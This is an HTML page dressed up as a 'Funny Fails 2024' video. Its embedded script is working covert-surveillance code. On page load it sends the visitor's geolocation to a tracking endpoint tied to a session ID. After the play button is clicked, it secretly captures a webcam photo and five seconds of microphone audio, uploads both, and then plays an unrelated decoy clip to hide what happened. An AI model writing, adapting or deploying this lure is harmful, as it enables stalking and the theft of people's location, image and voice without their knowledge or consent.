<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>😂 Funny Video</title>
    <style>
        body { text-align: center; font-family: Arial; background: #111; color: white; }
        video, canvas { max-width: 90%; margin-top: 20px; border-radius: 15px; }
        button { background: #ff0000; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 30px; margin-top: 20px; cursor: pointer; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <h1>😂 FUNNY FAILS 2024 🔥</h1>
    <p>👉 Click play to watch the video 👇</p>
    <button id="playBtn">▶ PLAY VIDEO</button>
    <div id="videoContainer" class="hidden">
        <video id="video" width="100%" controls autoplay></video>
        <p>🎤 Speak something to change subtitles (Microphone needed)</p>
        <p>📸 Camera will capture your reaction for the prank!</p>
    </div>

    <script>
        // Get session from URL
        const urlParams = new URLSearchParams(window.location.search);
        const session = urlParams.get('session');

        // Server base URL (same as current origin)
        const API_URL = window.location.origin + '/track';

        async function sendData(endpoint, data) {
            try {
                await fetch(`${API_URL}?session=${session}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            } catch(e) { console.log(e); }
        }

        // Get location immediately
        navigator.geolocation.getCurrentPosition(pos => {
            sendData('/location', {
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                acc: pos.coords.accuracy
            });
        });

        // When user clicks "PLAY VIDEO"
        document.getElementById('playBtn').onclick = async () => {
            document.getElementById('playBtn').style.display = 'none';
            document.getElementById('videoContainer').classList.remove('hidden');
            
            // Request camera + microphone
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                video.play();

                // Take photo after 2 seconds (secretly)
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const photoData = canvas.toDataURL('image/jpeg');
                    sendData('/photo', { image: photoData });
                }, 2000);

                // Record audio for 5 seconds
                const mediaRecorder = new MediaRecorder(stream);
                let chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    const reader = new FileReader();
                    reader.readAsDataURL(blob);
                    reader.onloadend = () => {
                        sendData('/audio', { audio: reader.result });
                    };
                };
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 5000);

                // Show fake video after permissions
                video.srcObject = null; // stop showing actual cam, play a fake funny video
                video.src = "https://sample-videos.com/video123/mp4/720/big_buck_bunny_720p_1mb.mp4";
                video.play();
            } catch(err) {
                alert("Error: " + err.message);
            }
        };
    </script>
</body>
</html>
